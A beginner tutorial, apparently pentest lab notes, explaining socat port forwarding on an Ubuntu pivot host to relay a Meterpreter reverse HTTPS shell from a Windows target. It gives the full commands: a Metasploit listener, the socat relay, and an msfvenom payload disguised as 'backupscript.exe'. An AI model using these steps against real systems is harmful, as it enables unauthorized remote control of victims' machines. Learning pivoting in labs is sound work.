## What is Socat Redirection (in simple words)?

Imagine you want to **talk to someone (Windows target)**, but you can’t **reach them directly**. However, there’s a **mutual friend (Ubuntu)** who **can talk to both of you**.

So, you tell your friend (Ubuntu):  
👉 “Hey, if the Windows guy talks to you, please pass that message to me!”

That’s **Socat** — a **helper tool** that forwards data between two people (or computers). It acts like a **middleman** for network connections.

## What are we trying to do?
You want to:

1. Get **remote control (reverse shell)** of a Windows computer.
2. But you can’t directly talk to it from your attack laptop.
3. You **can talk to Ubuntu**, and Ubuntu **can talk to Windows**.
4. So, you use **Socat on Ubuntu** to forward Windows's connection **back to you**.

💡 It’s like **passing secret notes through a friend** who sits between you and the target.

### Step 1: Start a listener (on your attacker machine)
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```
This means:  
"Hey, I’m listening on port 80. If anyone calls me, I’ll take control!"

### Step 2: Set up the **middleman** (Ubuntu with Socat)
On Ubuntu, run:
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

This says:

> “If someone talks to me (Ubuntu) on **port 8080**, I’ll forward their message to **my hacker friend (you)** on port **80**.”

### Step 3: Make a payload for Windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```
👉 “Call Ubuntu on 172.16.5.129:8080”

### Step 4: Run the payload on Windows

You somehow run `backupscript.exe` on the Windows machine (maybe upload it through RDP, SMB, PowerShell, etc.).

As soon as it runs:
- Windows tries to **connect to Ubuntu:8080**
- **Ubuntu forwards that to you**
- Your listener catches it
- 🔥 **You get a shell!**
